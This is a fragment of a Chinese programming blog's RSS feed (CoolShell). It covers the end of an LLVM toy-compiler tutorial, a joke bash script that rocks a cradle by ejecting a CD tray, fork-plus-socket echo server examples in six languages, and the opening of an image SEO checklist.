+Creating block
+Code is generated.
+; ModuleID = 'main'
+
+define internal void @main() {
+entry:
+	%0 = call i64 @do_math(i64 10)		;  [#uses=0]
+	ret void
+}
+
+define internal i64 @do_math(i64) {
+entry:
+	%a = alloca i64		;  [#uses=1]
+	%x = alloca i64		;  [#uses=1]
+	%1 = add i64 5, 3	;  [#uses=1]
+	%2 = load i64* %a	;  [#uses=1]
+	%3 = mul i64 %2, %1	;  [#uses=1]
+	store i64 %3, i64* %x
+	ret void
+}
+Running code...
+Code was run.
+</pre>
+<p><h2>8、结论</h2>
+</p>
+<p>是不是非常的酷？我同意如果你只是从这篇文章中拷贝粘贴的话，你可能会对运行得到的结果感觉有点失望，但是这点结果可能也会激发你更大的兴趣。此外，这就是本文的意义，这不是本篇指导文章的结束，这只是一个开始。因为有了这篇文章的介绍，你可以在文法分析，语法分析和装配语言的时候附加上一些疯狂的特性，然后创造出一个你自己命名的语言。你现在已经可以编译语句块了，那么你现在应该已经有如何继续下去的基本想法。<br />
+本文完整的代码在Github<a href="http://github.com/lsegal/my_toy_compiler">这里</a>。我一直都在避免提到这个代码，因为这个代码不是本文的重点，而仅仅是带过这部分代码。</p>
+<p>我意识到这是一篇非常长的文章，并且这篇文章中难免会有出错的地方，如果你找到了任何问题，在你觉得有空的时候，欢迎你给我发电子邮件，我将会调整我的文章。你如果向想我们共享一些信息，你也可以在你觉得有空的时候写信给我们。</p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/1654.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/11/250px-ChallengerCrew-150x150.jpg" alt="Richard Feynman, 挑战者号, 软件工程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1654.html" class="wp_rp_title">Richard Feynman, 挑战者号, 软件工程</a></li><li ><a href="https://coolshell.cn/articles/2365.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/6.jpg" alt="两个C++的资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2365.html" class="wp_rp_title">两个C++的资源</a></li><li ><a href="https://coolshell.cn/articles/652.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/17.jpg" alt="MySQL: InnoDB 还是 MyISAM?" width="150" height="150" /></a><a href="https://coolshell.cn/articles/652.html" class="wp_rp_title">MySQL: InnoDB 还是 MyISAM?</a></li><li ><a href="https://coolshell.cn/articles/1660.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg" alt="13个不错的Javascript和CSS的菜单" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1660.html" class="wp_rp_title">13个不错的Javascript和CSS的菜单</a></li><li ><a href="https://coolshell.cn/articles/7448.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg" alt="扎克伯格的一封信：关于Facebook IPO" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7448.html" class="wp_rp_title">扎克伯格的一封信：关于Facebook IPO</a></li><li ><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/03/rust-social-wide-150x150.jpg" alt="Rust语言的编程范式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1547.html">使用Flex Bison 和LLVM编写自己的编译器</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1547.html/feed</wfw:commentRss>
+			<slash:comments>31</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>用脚本实现哄小孩睡觉</title>
+		<link>https://coolshell.cn/articles/1539.html</link>
+					<comments>https://coolshell.cn/articles/1539.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 12 Oct 2009 02:05:38 +0000</pubDate>
+				<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[Bash]]></category>
+		<category><![CDATA[Linux]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1539</guid>
+
+					<description><![CDATA[<p>当然，不并需要一个天才式的人才能做到这个事，其实这个事情很简单。让我来一点一点向你解释。下面是一些准备工作。 首先，你得找一台PC机，得配上光驱，光驱可以破一点...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1539.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1539.html">用脚本实现哄小孩睡觉</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="size-full wp-image-1541 alignright" title="baby_linux" src="https://coolshell.cn/wp-content/uploads/2009/10/baby_linux.jpg" alt="baby_linux" width="152" height="111" />当然，不并需要一个天才式的人才能做到这个事，其实这个事情很简单。让我来一点一点向你解释。下面是一些准备工作。</p>
+<ul>
+<li>首先，你得找一台PC机，得配上光驱，光驱可以破一点。</li>
+<li>然后，你得给这台PC机上装上Linux，不需要太多的东西，最基本的就行了。</li>
+<li>然后，你得写下下面的代码。</li>
+</ul>
+<p><span id="more-1539"></span></p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">
+while [1 = 1]
+ do
+	#弹出光驱
+	eject
+	sleep 1
+
+	#收回光驱
+	eject -t
+	sleep 1
+ done
+</pre>
+<p>在运行代码之前，请确保你们小孩的摇篮和PC机的光驱连接在一起。当然，你也可以在脚本中播放一曲催眠曲。注意，脚本其中的sleep 1是为了配合上摇篮的节奏，这样需要你在实际过程中调试一下。</p>
+<p>这样的成本是不是有点高？居然还要达上一台电脑，呵呵。所以，我就不建议你用Windows来实现了，那样的成本可能会更高。<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/8883.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/01/linux-bash-300x225-150x150.jpg" alt="应该知道的Linux技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8883.html" class="wp_rp_title">应该知道的Linux技巧</a></li><li ><a href="https://coolshell.cn/articles/8619.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/11/shell.01-150x150.png" alt="你可能不知道的Shell" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8619.html" class="wp_rp_title">你可能不知道的Shell</a></li><li ><a href="https://coolshell.cn/articles/2987.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="用脚本实现哄宝宝睡觉(Demo)" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2987.html" class="wp_rp_title">用脚本实现哄宝宝睡觉(Demo)</a></li><li ><a href="https://coolshell.cn/articles/1379.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/13.jpg" alt="如何调试bash脚本" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1379.html" class="wp_rp_title">如何调试bash脚本</a></li><li ><a href="https://coolshell.cn/articles/22320.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/12/eBPF-150x150.jpeg" alt="eBPF 介绍" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22320.html" class="wp_rp_title">eBPF 介绍</a></li><li ><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/03/linux.ninja_-150x150.png" alt="打造高效的工作环境 &#8211; Shell 篇" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_title">打造高效的工作环境 &#8211; Shell 篇</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1539.html">用脚本实现哄小孩睡觉</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1539.html/feed</wfw:commentRss>
+			<slash:comments>33</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>到处都是Unix的胎记</title>
+		<link>https://coolshell.cn/articles/1532.html</link>
+					<comments>https://coolshell.cn/articles/1532.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Sun, 11 Oct 2009 10:01:06 +0000</pubDate>
+				<category><![CDATA[Unix/Linux]]></category>
+		<category><![CDATA[C++]]></category>
+		<category><![CDATA[fork]]></category>
+		<category><![CDATA[Haskell]]></category>
+		<category><![CDATA[Perl]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Python]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[socket]]></category>
+		<category><![CDATA[Unix]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1532</guid>
+
+					<description><![CDATA[<p>一说起Unix编程，不必多说，最著名的系统调用就是fork，pipe，exec，kill或是socket了（fork(2), execve(2), pipe(2...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1532.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1532.html">到处都是Unix的胎记</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>一说起Unix编程，不必多说，最著名的系统调用就是fork，pipe，exec，kill或是socket了（<a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fork.2.html"><code>fork(2)</code></a>, <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html"><code>execve(2)</code></a>, <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe.2.html"><code>pipe(2)</code></a>, <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/socketpair.2.html"><code>socketpair(2)</code></a>, <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/select.2.html"><code>select(2)</code></a>, <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html"><code>kill(2)</code></a>, <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaction.2.html"><code>sigaction(2)</code></a>）这些系统调用都像是Unix编程的胎记或签名一样，表明着它来自于Unix。</p>
+<p>下面这篇文章，将向大家展示Unix下最经典的socket的编程例子——使用fork + socket来创建一个TCP/IP的服务程序。这个编程模式很简单，首先是创建Socket，然后把其绑定在某个IP和Port上上侦听连接，接下来的一般做法是使用一个fork创建一个client服务进程再加上一个死循环用于处理和client的交互。这个模式是Unix下最经典的Socket编程例子。</p>
+<p>下面，让我们看看用C，Ruby，Python，Perl，PHP和Haskell来实现这一例子，你会发现这些例子中的Unix的胎记。如果你想知道这些例子中的技术细节，那么，向你推荐两本经典书——《Unix高级环境编程》和《Unix网络编程》。</p>
+<p><span id="more-1532"></span></p>
+<h4>C语言</h4>
+<p>我们先来看一下经典的C是怎么实现的。</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="c">/**
+ * A simple preforking echo server in C.
+ *
+ * Building:
+ *
+ * $ gcc -Wall -o echo echo.c
+ *
+ * Usage:
+ *
+ * $ ./echo
+ *
+ *   ~ then in another terminal ... ~
+ *
+ * $ echo 'Hello, world!' | nc localhost 4242
+ *
+ */
+
+#include &lt;unistd.h&gt; /* fork, close */
+#include &lt;stdlib.h&gt; /* exit */
+#include &lt;string.h&gt; /* strlen */
+#include &lt;stdio.h&gt; /* perror, fdopen, fgets */
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/wait.h&gt; /* waitpid */
+#include &lt;netdb.h&gt; /* getaddrinfo */
+
+#define die(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)
+
+#define PORT "4242"
+#define NUM_CHILDREN 3
+
+#define MAXLEN 1024
+
+int readline(int fd, char *buf, int maxlen); // forward declaration
+
+int
+main(int argc, char** argv)
+{
+    int i, n, sockfd, clientfd;
+    int yes = 1; // used in setsockopt(2)
+    struct addrinfo *ai;
+    struct sockaddr_in *client;
+    socklen_t client_t;
+    pid_t cpid; // child pid
+    char line[MAXLEN];
+    char cpid_s[32];
+    char welcome[32];
+
+    /* Create a socket and get its file descriptor -- socket(2) */
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == -1) {
+    die("Couldn't create a socket");
+    }
+
+    /* Prevents those dreaded "Address already in use" errors */
+    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&amp;yes, sizeof(int)) == -1) {
+    die("Couldn't setsockopt");
+    }
+
+    /* Fill the address info struct (host + port) -- getaddrinfo(3) */
+    if (getaddrinfo(NULL, PORT, NULL, &amp;ai) != 0) {
+    die("Couldn't get address");
+    }
+
+    /* Assign address to this socket's fd */
+    if (bind(sockfd, ai-&gt;ai_addr, ai-&gt;ai_addrlen) != 0) {
+    die("Couldn't bind socket to address");
+    }
+
+    /* Free the memory used by our address info struct */
+    freeaddrinfo(ai);
+
+    /* Mark this socket as able to accept incoming connections */
+    if (listen(sockfd, 10) == -1) {
+    die("Couldn't make socket listen");
+    }
+
+    /* Fork you some child processes. */
+    for (i = 0; i &lt; NUM_CHILDREN; i++) {
+    cpid = fork();
+    if (cpid == -1) {
+        die("Couldn't fork");
+    }
+
+    if (cpid == 0) { // We're in the child ...
+        for (;;) { // Run forever ...
+        /* Necessary initialization for accept(2) */
+        client_t = sizeof client;
+
+        /* Blocks! */
+        clientfd = accept(sockfd, (struct sockaddr *)&amp;client, &amp;client_t);
+        if (clientfd == -1) {
+            die("Couldn't accept a connection");
+        }
+
+        /* Send a welcome message/prompt */
+        bzero(cpid_s, 32);
+        bzero(welcome, 32);
+        sprintf(cpid_s, "%d", getpid());
+        sprintf(welcome, "Child %s echo&gt; ", cpid_s);
+        send(clientfd, welcome, strlen(welcome), 0);
+
+        /* Read a line from the client socket ... */
+        n = readline(clientfd, line, MAXLEN);
+        if (n == -1) {
+            die("Couldn't read line from connection");
+        }
+
+        /* ... and echo it back */
+        send(clientfd, line, n, 0);
+
+        /* Clean up the client socket */
+        close(clientfd);
+        }
+    }
+    }
+
+    /* Sit back and wait for all child processes to exit */
+    while (waitpid(-1, NULL, 0) &gt; 0);
+
+    /* Close up our socket */
+    close(sockfd);
+
+    return 0;
+}
+
+/**
+ * Simple utility function that reads a line from a file descriptor fd,
+ * up to maxlen bytes -- ripped from Unix Network Programming, Stevens.
+ */
+int
+readline(int fd, char *buf, int maxlen)
+{
+    int n, rc;
+    char c;
+
+    for (n = 1; n &lt; maxlen; n++) {
+    if ((rc = read(fd, &amp;c, 1)) == 1) {
+        *buf++ = c;
+        if (c == '\n')
+        break;
+    } else if (rc == 0) {
+        if (n == 1)
+        return 0; // EOF, no data read
+        else
+        break; // EOF, read some data
+    } else
+        return -1; // error
+    }
+
+    *buf = '\0'; // null-terminate
+    return n;
+}
+</pre>
+<h4>Ruby</h4>
+<p>下面是Ruby，你可以看到其中的fork</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="ruby">
+# simple preforking echo server in Ruby
+require 'socket'
+
+# Create a socket, bind it to localhost:4242, and start listening.
+# Runs once in the parent; all forked children inherit the socket's
+# file descriptor.
+acceptor = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM, 0)
+address = Socket.pack_sockaddr_in(4242, 'localhost')
+acceptor.bind(address)
+acceptor.listen(10)
+
+# Close the socket when we exit the parent or any child process. This
+# only closes the file descriptor in the calling process, it does not
+# take the socket out of the listening state (until the last fd is
+# closed).
+#
+# The trap is guaranteed to happen, and guaranteed to happen only
+# once, right before the process exits for any reason (unless
+# it's terminated with a SIGKILL).
+trap('EXIT') { acceptor.close }
+
+# Fork you some child processes. In the parent, the call to fork
+# returns immediately with the pid of the child process; fork never
+# returns in the child because we exit at the end of the block.
+3.times do
+  fork do
+    # now we're in the child process; trap (Ctrl-C) interrupts and
+    # exit immediately instead of dumping stack to stderr.
+    trap('INT') { exit }
+
+    puts "child #$$ accepting on shared socket (localhost:4242)"
+    loop {
+      # This is where the magic happens. accept(2) blocks until a
+      # new connection is ready to be dequeued.
+      socket, addr = acceptor.accept
+      socket.write "child #$$ echo&gt; "
+      socket.flush
+      message = socket.gets
+      socket.write message
+      socket.close
+      puts "child #$$ echo'd: '#{message.strip}'"
+    }
+    exit
+  end
+end
+
+# Trap (Ctrl-C) interrupts, write a note, and exit immediately
+# in parent. This trap is not inherited by the forks because it
+# runs after forking has commenced.
+trap('INT') { puts "\nbailing" ; exit }
+
+# Sit back and wait for all child processes to exit.
+Process.waitall
+
+</pre>
+<h4>Python</h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">"""
+Simple preforking echo server in Python.
+"""
+
+import os
+import sys
+import socket
+
+# Create a socket, bind it to localhost:4242, and start
+# listening. Runs once in the parent; all forked children
+# inherit the socket's file descriptor.
+acceptor = socket.socket()
+acceptor.bind(('localhost', 4242))
+acceptor.listen(10)
+
+# Ryan's Ruby code here traps EXIT and closes the socket. This
+# isn't required in Python; the socket will be closed when the
+# socket object gets garbage collected.
+
+# Fork you some child processes. In the parent, the call to
+# fork returns immediately with the pid of the child process;
+# fork never returns in the child because we exit at the end
+# of the block.
+for i in range(3):
+    pid = os.fork()
+
+    # os.fork() returns 0 in the child process and the child's
+    # process id in the parent. So if pid == 0 then we're in
+    # the child process.
+    if pid == 0:
+        # now we're in the child process; trap (Ctrl-C)
+        # interrupts by catching KeyboardInterrupt) and exit
+        # immediately instead of dumping stack to stderr.
+        childpid = os.getpid()
+        print "Child %s listening on localhost:4242" % childpid
+        try:
+            while 1:
+                # This is where the magic happens. accept(2)
+                # blocks until a new connection is ready to be
+                # dequeued.
+                conn, addr = acceptor.accept()
+
+                # For easier use, turn the socket connection
+                # into a file-like object.
+                flo = conn.makefile()
+                flo.write('Child %s echo&gt; ' % childpid)
+                flo.flush()
+                message = flo.readline()
+                flo.write(message)
+                flo.close()
+                conn.close()
+                print "Child %s echo'd: %r" % \
+                          (childpid, message.strip())
+        except KeyboardInterrupt:
+            sys.exit()
+
+# Sit back and wait for all child processes to exit.
+#
+# Trap interrupts, write a note, and exit immediately in
+# parent. This trap is not inherited by the forks because it
+# runs after forking has commenced.
+try:
+    os.waitpid(-1, 0)
+except KeyboardInterrupt:
+    print "\nbailing"
+    sys.exit()
+</pre>
+<h4>Perl</h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="perl">#!/usr/bin/perl
+use 5.010;
+use strict;
+
+# simple preforking echo server in Perl
+use Proc::Fork;
+use IO::Socket::INET;
+
+sub strip { s/\A\s+//, s/\s+\z// for my @r = @_; @r }
+
+# Create a socket, bind it to localhost:4242, and start listening.
+# Runs once in the parent; all forked children inherit the socket's
+# file descriptor.
+my $acceptor = IO::Socket::INET-&gt;new(
+    LocalPort =&gt; 4242,
+    Reuse     =&gt; 1,
+    Listen    =&gt; 10,
+) or die "Couln't start server: $!\n";
+
+# Close the socket when we exit the parent or any child process. This
+# only closes the file descriptor in the calling process, it does not
+# take the socket out of the listening state (until the last fd is
+# closed).
+END { $acceptor-&gt;close }
+
+# Fork you some child processes. The code after the run_fork block runs
+# in all process, but because the child block ends in an exit call, only
+# the parent executes the rest of the program. If a parent block were
+# specified here, it would be invoked in the parent only, and passed the
+# PID of the child process.
+for ( 1 .. 3 ) {
+    run_fork { child {
+        while (1) {
+            my $socket = $acceptor-&gt;accept;
+            $socket-&gt;printflush( "child $$ echo&gt; " );
+            my $message = $socket-&gt;getline;
+            $socket-&gt;print( $message );
+            $socket-&gt;close;
+            say "child $$ echo'd: '${\strip $message}'";
+        }
+        exit;
+    } }
+}
+
+# Trap (Ctrl-C) interrupts, write a note, and exit immediately
+# in parent. This trap is not inherited by the forks because it
+# runs after forking has commenced.
+$SIG{ 'INT' } = sub { print "bailing\n"; exit };
+
+# Sit back and wait for all child processes to exit.
+1 while 0 &lt; waitpid -1, 0;
+</pre>
+<h4>PHP</h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="perl">
+&lt;?
+/*
+Simple preforking echo server in PHP.
+Russell Beattie (russellbeattie.com)
+*/
+
+/* Allow the script to hang around waiting for connections. */
+set_time_limit(0);
+
+# Create a socket, bind it to localhost:4242, and start
+# listening. Runs once in the parent; all forked children
+# inherit the socket's file descriptor.
+$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_bind($socket,'localhost', 4242);
+socket_listen($socket, 10);
+
+pcntl_signal(SIGTERM, 'shutdown');
+pcntl_signal(SIGINT, 'shutdown');
+
+function shutdown($signal){
+    global $socket;
+    socket_close($socket);
+    exit();
+}
+# Fork you some child processes. In the parent, the call to
+# fork returns immediately with the pid of the child process;
+# fork never returns in the child because we exit at the end
+# of the block.
+for($x = 1; $x &lt;= 3; $x++){
+   
+    $pid = pcntl_fork();
+   
+    # pcntl_fork() returns 0 in the child process and the child's
+    # process id in the parent. So if $pid == 0 then we're in
+    # the child process.
+    if($pid == 0){
+
+        $childpid = posix_getpid();
+       
+        echo "Child $childpid listening on localhost:4242 \n";
+
+        while(true){
+            # This is where the magic happens. accept(2)
+            # blocks until a new connection is ready to be
+            # dequeued.
+            $conn = socket_accept($socket);
+
+            $message = socket_read($conn,1000,PHP_NORMAL_READ);
+           
+            socket_write($conn, "Child $childpid echo&gt; $message");
+       
+            socket_close($conn);
+       
+            echo "Child $childpid echo'd: $message \n";
+       
+        }
+
+    }
+}
+#
+# Trap interrupts, write a note, and exit immediately in
+# parent. This trap is not inherited by the forks because it
+# runs after forking has commenced.
+try{
+
+    pcntl_waitpid(-1, $status);
+
+} catch (Exception $e) {
+
+    echo "bailing \n";
+    exit();
+
+}</pre>
+<h4>Haskell</h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="haskell">import Network
+import Prelude hiding ((-))
+import Control.Monad
+import System.IO
+import Control.Applicative
+import System.Posix
+import System.Exit
+import System.Posix.Signals
+
+main :: IO ()
+main = with =&lt;&lt; (listenOn - PortNumber 4242) where
+
+  with socket = do
+    replicateM 3 - forkProcess work
+    wait
+
+    where
+    work = do
+      installHandler sigINT (Catch trap_int) Nothing
+      pid &lt;- show &lt;$&gt; getProcessID
+      puts - "child " ++ pid ++ " accepting on shared socket (localhost:4242)"
+     
+      forever - do
+        (h, _, _) &lt;- accept socket
+
+        let write   = hPutStr h
+            flush   = hFlush h
+            getline = hGetLine h
+            close   = hClose h
+
+        write - "child " ++ pid ++ " echo&gt; "
+        flush
+        message &lt;- getline
+        write - message ++ "\n"
+        puts - "child " ++ pid ++ " echo'd: '" ++ message ++ "'"
+        close
+
+    wait = forever - do
+      ( const () &lt;$&gt; getAnyProcessStatus True True  ) <code data-enlighter-language="raw" class="EnlighterJSRAW">catch</code> const trap_exit
+
+    trap_int = exitImmediately ExitSuccess
+
+    trap_exit = do
+      puts "\nbailing"
+      sClose socket
+      exitSuccess
+
+    puts = putStrLn
+
+  (-) = ($)
+  infixr 0 -
+
+</pre>
+<p>如果你知道更多的，请你告诉我们。（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/1839.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/11/oscar-meyer-wienermobile-150x150.jpg" alt="编程语言汽车" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1839.html" class="wp_rp_title">编程语言汽车</a></li><li ><a href="https://coolshell.cn/articles/2529.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/6.jpg" alt="StackOverflow的404错误页" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2529.html" class="wp_rp_title">StackOverflow的404错误页</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/7965.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/07/fork01jpg-150x150.jpg" alt="一个fork的面试题" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7965.html" class="wp_rp_title">一个fork的面试题</a></li><li ><a href="https://coolshell.cn/articles/7886.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/07/muxnt-150x150.jpg" alt="代码执行的效率" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7886.html" class="wp_rp_title">代码执行的效率</a></li><li ><a href="https://coolshell.cn/articles/2053.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/20.jpg" alt="最为奇怪的程序语言的特性" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2053.html" class="wp_rp_title">最为奇怪的程序语言的特性</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1532.html">到处都是Unix的胎记</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1532.html/feed</wfw:commentRss>
+			<slash:comments>19</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>图片搜索引擎优化Checklist</title>
+		<link>https://coolshell.cn/articles/1528.html</link>
+					<comments>https://coolshell.cn/articles/1528.html#respond</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Sun, 11 Oct 2009 03:17:01 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[技术读物]]></category>
+		<category><![CDATA[Checklist]]></category>
+		<category><![CDATA[SEO]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1528</guid>
+
+					<description><![CDATA[<p>今天，专业的搜索引擎优化SEO（Search Engine Optimizers）会让你的网页或文章能更多得被搜索并访问到。而图片的搜索优化则是这项技术中非常特...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1528.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1528.html">图片搜索引擎优化Checklist</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script></p>
+<p style="font-size: 12px; font-family: Arial, Helvetica, sans-serif;">今天，专业的搜索引擎优化SEO（Search Engine Optimizers）会让你的网页或文章能更多得被搜索并访问到。而图片的搜索优化则是这项技术中非常特别的一部分，它可以让你的图片更容易地被人搜索到，比如：艺术图片，服务设计，或是家具等等。相信大家都知道图片远比文字更有吸引力，这是因为我们都知道——“一图胜千言”。</p>
